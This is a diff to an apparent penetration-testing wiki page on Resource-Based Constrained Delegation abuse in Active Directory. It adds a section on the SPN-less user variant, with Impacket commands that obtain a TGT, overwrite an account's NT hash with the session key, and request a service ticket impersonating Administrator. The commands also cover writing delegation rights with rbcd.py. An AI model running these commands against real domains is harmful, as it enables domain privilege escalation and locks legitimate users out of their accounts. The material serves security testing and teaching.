@@ -10,6 +10,10 @@ Machine accounts can edit their own `msDS-AllowedToActOnBehalfOfOtherIdentity` a
 
 For this attack to work, the attacker needs to populate the target attribute with an account having a `ServicePrincipalName` set (needed for Kerberos delegation operations). The usual way to conduct these attacks is to create a computer account, which comes with an SPN set. This is usually possible thanks to a domain-level attribute called [`MachineAccountQuota`](../../domain-settings/machineaccountquota.md) that allows regular users to create up to 10 computer accounts. While this "computer account creation + RBCD attack" is the most common exploitation path, doing so with a user account (having at least one SPN) is perfectly feasible.
 
+{% hint style="info" %}
+In 2022, [Jame Forshaw](https://twitter.com/tiraniddo) demonstrated that the SPN requirement wasn't completely mandatory and RBCD could be operated without: [Exploiting RBCD using a normal user](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html). While this technique is a bit trickier and should absolutely be avoided on regular user accounts (the technique renders them unusable for normal people), it allows to abuse RBCD even if the [`MachineAccountQuota`](../../domain-settings/machineaccountquota.md) is set to 0. The technique is demonstrated later on in this page ([RBCD on SPN-less user](rbcd.md#rbcd-on-spn-less-users)).
+{% endhint %}
+
 Then, in order to abuse this, the attacker has to control the account the object's attribute has been populated with (i.e. the account that has an SPN). Using that account's credentials, the attacker can obtain a ticket through `S4U2Self` and `S4U2Proxy` requests, just like constrained delegation with protocol transition.
 
 In the end, an RBCD abuse results in a Service Ticket to authenticate on a target service on behalf of a user. Once the final Service Ticket is obtained, it can be used with [Pass-the-Ticket](../ptt.md) to access the target service.&#x20;
@@ -32,25 +36,33 @@ The `msDS-AllowedToActOnBehalfOfOtherIdentity` was introduced with Windows Serve
 
 [Impacket](https://github.com/SecureAuthCorp/impacket/)'s [rbcd.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/rbcd.py) script (Python) _c_an be used to read, write or clear the delegation rights, using the credentials of a domain user that has the needed permissions.
 
+{% code overflow="wrap" %}
 ```bash
 # Read the attribute
-rbcd.py -delegate-to 'target$' -dc-ip 'DomainController' -action read 'DOMAIN'/'POWERFULUSER':'PASSWORD'
+rbcd.py -delegate-to 'target$' -dc-ip 'DomainController' -action 'read' 'domain'/'PowerfulUser':'Password'
 
 # Append value to the msDS-AllowedToActOnBehalfOfOtherIdentity
-rbcd.py -delegate-from 'controlledaccountwithSPN' -delegate-to 'target$' -dc-ip 'DomainController' -action write 'DOMAIN'/'POWERFULUSER':'PASSWORD'
+rbcd.py -delegate-from 'controlledaccountwithSPN' -delegate-to 'target$' -dc-ip 'DomainController' -action 'write' 'domain'/'PowerfulUser':'Password'
 ```
+{% endcode %}
 
 {% hint style="success" %}
 Testers can also use [ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) to set the delegation rights with the `--delegate-access` option when conducting this attack from a [relayed authentication](../../ntlm/relay.md).
+{% endhint %}
+
+{% hint style="info" %}
+In this example, `controlledaccountwithSPN` can be [a computer account created for the attack](../../domain-settings/machineaccountquota.md#create-a-computer-account), or any other account -with at least one Service Principal Name set- which credentials are known to the attacker.
 {% endhint %}
 
 **2 - Obtain a ticket (delegation operation)** :ticket: ****&#x20;
 
 Once the attribute has been modified, the [Impacket](https://github.com/SecureAuthCorp/impacket) script [getST](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py) (Python) can then perform all the necessary steps to obtain the final "impersonating" ST (in this case, "Administrator" is impersonated but it can be any user in the environment).
 
+{% code overflow="wrap" %}
 ```bash
-getST.py -spn "cifs/target" -impersonate Administrator -dc-ip $DomainController 'DOMAIN/controlledaccountwithSPN:SomePassword'
+getST.py -spn 'cifs/target' -impersonate Administrator -dc-ip 'DomainController' 'domain/controlledaccountwithSPN:SomePassword'
 ```
+{% endcode %}
 
 {% hint style="warning" %}
 In [some cases](./#theory), the delegation will not work. Depending on the context, the [bronze bit ](../forged-tickets.md#bronze-bit-cve-2020-17049)vulnerability (CVE-2020-17049) can be used with the `-force-forwardable` option to try to bypass restrictions.
@@ -127,6 +139,56 @@ Once the ticket is injected, it can natively be used when accessing the service 
 {% endtab %}
 {% endtabs %}
 
+### RBCD on SPN-less users
+
+In 2022, [Jame Forshaw](https://twitter.com/tiraniddo) demonstrated that the SPN requirement wasn't completely mandatory and RBCD could be operated without: [Exploiting RBCD using a normal user](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html). While this technique is a bit trickier and should absolutely be avoided on regular user accounts (the technique renders them unusable for normal people), it allows to abuse RBCD even if the [`MachineAccountQuota`](../../domain-settings/machineaccountquota.md) is set to 0. In this case, the first (edit the "rbcd" attribute) and last ("Pass-the-ticket") steps are the same. Only the "Obtain a ticket" step changes.
+
+The technique is as follows:
+
+1. Obtain a TGT for the SPN-less user allowed to delegate to a target and retrieve the TGT session key.
+2. Change the user's password hash and set it to the TGT session key.
+3. [Combine S4U2self and U2U](../#s4u2self-+-u2u) so that the SPN-less user can obtain a service ticket to itself, on behalf of another (powerful) user, and then proceed to S4U2proxy to obtain a service ticket to the target the user can delegate to, on behalf of the other, more powerful, user.
+4. [Pass the ticket](../ptt.md) and access the target, as the delegated other
+
+{% hint style="danger" %}
+While this technique allows for an abuse of the RBCD primitive, even when the [`MachineAccountQuota`](../../domain-settings/machineaccountquota.md) is set to 0, or when the absence of LDAPS limits the creation of computer accounts, it requires a sacrificial user account. In the abuse process, the user account's password hash will be reset with another hash that has no known plaintext, effectively preventing regular users from using this account.
+{% endhint %}
+
+{% tabs %}
+{% tab title="UNIX-like" %}
+From UNIX-like systems, [Impacket](https://github.com/SecureAuthCorp/impacket) (Python) scripts can be used to operate that technique. At the time of writing, September 7th 2022, some of the tools used below are in Pull Requests still being reviewed before merge ([#1201](https://github.com/SecureAuthCorp/impacket/pull/1201) and [#1202](https://github.com/SecureAuthCorp/impacket/pull/1202)).
+
+{% code overflow="wrap" %}
+```bash
+# Obtain a TGT through overpass-the-hash to use RC4
+getTGT.py -hashes :$(pypykatz crypto nt 'SomePassword') 'domain'/'controlledaccountwithoutSPN'
+
+# Obtain the TGT session key
+describeTicket.py 'TGT.ccache' | grep 'Ticket Session Key'
+
+# Change the controlledaccountwithoutSPN's NT hash with the TGT session key
+smbpasswd.py -newhashes :TGTSessionKey 'domain'/'controlledaccountwithoutSPN':'SomePassword'@'DomainController'
+
+# Obtain the delegated service ticket through S4U2self+U2U, followed by S4U2proxy (the steps could be conducted individually with the -self and -additional-ticket flags)
+KRBR5CCNAME='TGT.ccache' getST.py -u2u -impersonate Administrator -k -no-pass 'domain'/'controlledaccountwithoutSPN'
+
+# The password can then be reset to its old value (or another one if the domain policy forbids it, which is usually the case)
+smbpasswd.py -hashes :TGTSessionKey -newhashes :OldNTHash 'domain'/'controlledaccountwithoutSPN'@'DomainController'
+```
+{% endcode %}
+
+After these steps, the final service ticket can be used with [Pass-the-ticket](../ptt.md).
+{% endtab %}
+
+{% tab title="Windows" %}
+From Windows systems, [Rubeus](https://github.com/GhostPack/Rubeus) (C#) can be used to operate the technique.
+
+The steps detailed in [PR #137](https://github.com/GhostPack/Rubeus/pull/137) can be followed.
+
+After these steps, the final service ticket can be used with [Pass-the-ticket](../ptt.md).
+{% endtab %}
+{% endtabs %}
+
 ## Resources
 
 {% embed url="https://blog.stealthbits.com/resource-based-constrained-delegation-abuse/" %}
@@ -136,3 +198,5 @@ Once the ticket is injected, it can natively be used when accessing the service 
 {% embed url="https://www.netspi.com/blog/technical/network-penetration-testing/cve-2020-17049-kerberos-bronze-bit-theory/" %}
 
 {% embed url="https://dirkjanm.io/abusing-forgotten-permissions-on-precreated-computer-objects-in-active-directory/" %}
+
+{% embed url="https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html" %}
